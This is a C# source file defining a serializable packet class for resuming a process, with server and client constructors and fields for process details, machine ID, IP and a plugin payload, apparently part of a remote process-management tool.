using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class ResumeProcessPacket : IPacket
    {

        //server
        public ResumeProcessPacket(int processId, string processName, int rowIndex) : base()
        {   
            this.packetType = PacketType.PM_RESUME_PROCESS; 
            
            this.processId = processId;
            this.processName = processName;
            this.rowIndex = rowIndex;
        }

        //client
        public ResumeProcessPacket(bool resumed, int processId, string processName, int rowIndex, string baseIp, string HWID) : base()
        {
            this.packetType = PacketType.PM_RESUME_PROCESS;
            this.baseIp = baseIp;
            this.HWID = HWID;     
            
            this.resumed = resumed;
            this.processId = processId;
            this.processName = processName;
            this.rowIndex = rowIndex;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public int rowIndex { get; set; }
        public string processName { get; set; }
        public int processId { get; set; }
        public bool resumed { get; set; }
    }
}
